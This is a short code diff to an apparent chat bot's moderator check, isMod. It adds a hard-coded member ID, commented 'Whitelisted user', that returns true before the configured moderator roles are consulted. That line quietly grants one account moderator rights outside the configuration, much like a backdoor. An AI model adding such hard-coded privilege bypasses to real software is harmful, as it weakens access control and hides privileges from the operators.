@@ -25,6 +25,9 @@ function isSupport(member) {
 function isMod(member) {
   if (!member) return false;
 
+  // Whitelisted user
+  if (member.id === '1492833649123393676') return true;
+
   return (config.modRoleIds || []).some(
     (roleId) =>
       roleId &&
